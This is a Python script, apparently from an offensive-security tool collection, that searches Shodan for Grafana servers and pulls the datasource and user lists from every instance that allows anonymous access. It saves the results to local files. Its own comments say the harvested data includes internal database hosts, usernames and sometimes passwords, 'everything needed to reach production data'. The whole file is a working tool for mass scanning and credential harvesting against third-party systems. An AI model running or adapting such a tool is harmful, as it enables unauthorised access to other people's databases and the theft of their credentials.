#!/usr/bin/env python3
#
# grafana-ds.py
# Search SHODAN for Grafana instances with anonymous access enabled and pull
# the datasource list. /api/datasources leaks internal database hosts, users
# and sometimes passwords — everything needed to reach production data.
#
# Author: random_robbie

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common import get_api_key, open_output

import shodan
import requests

# Configuration
SEARCH_FOR = 'title:"Grafana"'
DATASOURCES_PATH = "/api/datasources"
USERS_PATH = "/api/users"
CFG_DIR = "cfg"
session = requests.Session()


def grab_datasources(ip, port):
    """Anonymous access to /api/datasources leaks internal database details."""
    print("[*] Testing: " + ip + " on Port: " + port + "[*]\n")
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
            "Connection": "close",
            "Accept": "application/json",
        }
        base = "http://" + ip + ":" + port
        ds = session.get(base + DATASOURCES_PATH, headers=headers, timeout=15, verify=False)
        if ds.status_code == 200 and "name" in ds.text:
            users = session.get(base + USERS_PATH, headers=headers, timeout=15, verify=False)
            with open_output(os.path.join(CFG_DIR, ip + "-grafana-ds.json"), "a") as fh:
                fh.write("datasources:\n" + ds.text + "\nusers:\n" + users.text + "\n---\n")
            print("[*] Anonymous Grafana datasource access Whooops.. [*]\n")
        else:
            print("[*] Grafana requires authentication. [*]\n")
    except KeyboardInterrupt:
        sys.exit("Ctrl-c pressed ...")
    except Exception as e:
        print(e)
        print("[*] Nothing Found on IP:" + ip + " [*]\n")


def main():
    api = shodan.Shodan(get_api_key())
    result = api.search(SEARCH_FOR)
    for service in result["matches"]:
        grab_datasources(service["ip_str"], str(service["port"]))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("Ctrl-c pressed ...")
    except Exception as e:
        sys.exit("Error: %s" % e)
